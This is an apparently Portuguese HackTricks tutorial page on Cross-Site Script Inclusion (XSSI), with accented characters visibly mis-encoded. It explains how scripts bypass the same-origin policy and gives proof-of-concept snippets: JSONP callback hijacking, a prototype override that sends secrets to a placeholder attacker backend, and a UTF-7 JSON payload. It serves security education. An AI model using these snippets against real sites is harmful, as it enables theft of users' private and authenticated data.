# XSSI (Inclus√£o de Script de Sites Cruzados)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>


## Informa√ß√µes B√°sicas

**Inclus√£o de Script de Sites Cruzados (XSSI)** √© uma vulnerabilidade que surge da natureza da tag `script` em HTML. Ao contr√°rio da maioria dos recursos, que est√£o sujeitos √† **Pol√≠tica de Mesma Origem (SOP)**, scripts podem ser inclu√≠dos de diferentes dom√≠nios. Esse comportamento √© destinado a facilitar o uso de bibliotecas e outros recursos hospedados em servidores diferentes, mas tamb√©m introduz um risco de seguran√ßa potencial.

### Principais Caracter√≠sticas do **XSSI**:
- **Burla da SOP**: Scripts est√£o isentos da **Pol√≠tica de Mesma Origem**, permitindo que sejam inclu√≠dos em diferentes dom√≠nios.
- **Exposi√ß√£o de Dados**: Um atacante pode explorar esse comportamento para ler dados carregados via a tag `script`.
- **Impacto no JavaScript Din√¢mico/JSONP**: **XSSI** √© particularmente relevante para JavaScript din√¢mico ou **JSON com Preenchimento (JSONP)**. Essas tecnologias frequentemente usam informa√ß√µes de "autoridade-ambiente" (como cookies) para autentica√ß√£o. Quando uma solicita√ß√£o de script √© feita para um host diferente, essas credenciais (por exemplo, cookies) s√£o automaticamente inclu√≠das na solicita√ß√£o.
- **Vazamento de Token de Autentica√ß√£o**: Se um atacante puder enganar o navegador de um usu√°rio para solicitar um script de um servidor que controlam, eles podem acessar informa√ß√µes sens√≠veis contidas nessas solicita√ß√µes.

### Tipos

1. **JavaScript Est√°tico** - Representa a forma convencional de XSSI.
2. **JavaScript Est√°tico com Autentica√ß√£o** - Esse tipo √© distinto porque requer autentica√ß√£o para acessar.
3. **JavaScript Din√¢mico** - Envolve JavaScript que gera conte√∫do dinamicamente.
4. **N√£o-JavaScript** - Refere-se a vulnerabilidades que n√£o envolvem JavaScript diretamente.

**As informa√ß√µes a seguir s√£o um resumo de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Consulte para mais detalhes.


### XSSI Regular
Neste m√©todo, informa√ß√µes privadas s√£o incorporadas em um arquivo JavaScript globalmente acess√≠vel. Os atacantes podem identificar esses arquivos usando m√©todos como leitura de arquivos, pesquisas de palavras-chave ou express√µes regulares. Uma vez localizado, o script contendo informa√ß√µes privadas pode ser inclu√≠do em conte√∫do malicioso, permitindo acesso n√£o autorizado a dados sens√≠veis. Uma t√©cnica de explora√ß√£o de exemplo √© mostrada abaixo:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### XSSI baseado em JavaScript din√¢mico e XSSI baseado em JavaScript autenticado
Esses tipos de ataques XSSI envolvem informa√ß√µes confidenciais sendo adicionadas dinamicamente ao script em resposta a uma solicita√ß√£o do usu√°rio. A detec√ß√£o pode ser realizada enviando solicita√ß√µes com e sem cookies e comparando as respostas. Se as informa√ß√µes diferirem, isso pode indicar a presen√ßa de informa√ß√µes confidenciais. Esse processo pode ser automatizado usando ferramentas como a extens√£o Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Se os dados confidenciais estiverem armazenados em uma vari√°vel global, eles podem ser explorados usando m√©todos semelhantes aos usados no XSSI Regular. No entanto, se os dados confidenciais estiverem inclu√≠dos em uma resposta JSONP, os atacantes podem sequestrar a fun√ß√£o de retorno de chamada para recuperar as informa√ß√µes. Isso pode ser feito manipulando objetos globais ou configurando uma fun√ß√£o para ser executada pela resposta JSONP, conforme demonstrado abaixo:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Para vari√°veis que n√£o residem no namespace global, *manipula√ß√£o de prot√≥tipo* √†s vezes pode ser explorada. Essa t√©cnica aproveita o design do JavaScript, onde a interpreta√ß√£o do c√≥digo envolve percorrer a cadeia de prot√≥tipos para localizar a propriedade chamada. Ao substituir certas fun√ß√µes, como `slice` do `Array`, os atacantes podem acessar e vazar vari√°veis n√£o globais:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Mais detalhes sobre vetores de ataque podem ser encontrados no trabalho do Pesquisador de Seguran√ßa [Sebastian Lekies](https://twitter.com/slekies), que mant√©m uma lista de [vetores](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
A pesquisa de Takeshi Terada introduz outra forma de XSSI, onde arquivos Non-Script, como CSV, s√£o vazados entre origens ao serem inclu√≠dos como fontes em uma tag `script`. Inst√¢ncias hist√≥ricas de XSSI, como o ataque de 2006 de Jeremiah Grossman para ler um cat√°logo de endere√ßos completo do Google e o vazamento de dados JSON de 2007 de Joe Walker, destacam a gravidade dessas amea√ßas. Al√©m disso, Gareth Heyes descreve uma variante de ataque envolvendo JSON codificado em UTF-7 para escapar do formato JSON e executar scripts, eficaz em certos navegadores:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
